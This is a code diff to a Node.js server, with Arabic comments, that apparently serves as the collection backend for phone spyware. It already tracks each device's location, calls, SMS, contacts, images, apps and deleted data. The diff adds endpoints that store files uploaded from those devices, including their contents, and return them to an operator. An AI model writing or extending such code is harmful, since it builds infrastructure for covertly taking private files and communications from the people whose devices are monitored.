@@ -56,6 +56,29 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, deleted_count: deleted.length });
         }
         
+        // ✅ حفظ الملفات المحملة
+        if (data.type === 'file_data') {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            
+            const filesFile = path.join(deviceDir, 'downloaded_files.json');
+            let files = [];
+            if (fs.existsSync(filesFile)) files = JSON.parse(fs.readFileSync(filesFile, 'utf8'));
+            
+            files.push({
+                name: data.file_name,
+                path: data.file_path,
+                size: data.file_size,
+                data: data.file_data,
+                date: data.timestamp
+            });
+            
+            fs.writeFileSync(filesFile, JSON.stringify(files, null, 2));
+            updateDevicesList(deviceId, null);
+            return res.json({ success: true, files_count: files.length });
+        }
+        
         // ✅ البيانات العادية
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
@@ -141,8 +164,9 @@ app.get('/live.php', (req, res) => {
         const dataFile = path.join(dataDir, deviceId, 'data.json');
         const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
         const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
+        const filesFile = path.join(dataDir, deviceId, 'downloaded_files.json');
         
-        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0, deleted_count: 0 };
+        let response = { online: false, network: 'غير متصل', battery: null, location: null, last_seen: 0, seconds_ago: 999999, call_count: 0, sms_count: 0, contacts_count: 0, images_count: 0, apps_count: 0, deleted_count: 0, files_count: 0 };
         
         if (fs.existsSync(liveFile)) {
             const live = JSON.parse(fs.readFileSync(liveFile, 'utf8'));
@@ -169,6 +193,10 @@ app.get('/live.php', (req, res) => {
         
         if (fs.existsSync(deletedFile)) {
             response.deleted_count = JSON.parse(fs.readFileSync(deletedFile, 'utf8')).length;
+        }
+        
+        if (fs.existsSync(filesFile)) {
+            response.files_count = JSON.parse(fs.readFileSync(filesFile, 'utf8')).length;
         }
         
         res.json(response);
@@ -218,10 +246,16 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
         
-        // ✅ استرجاع المحذوفات
         if (action === 'get_deleted') {
             const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
             if (fs.existsSync(deletedFile)) return res.json(JSON.parse(fs.readFileSync(deletedFile, 'utf8')));
+            return res.json([]);
+        }
+        
+        // ✅ استرجاع الملفات المحملة
+        if (action === 'get_files') {
+            const filesFile = path.join(dataDir, deviceId, 'downloaded_files.json');
+            if (fs.existsSync(filesFile)) return res.json(JSON.parse(fs.readFileSync(filesFile, 'utf8')));
             return res.json([]);
         }
         
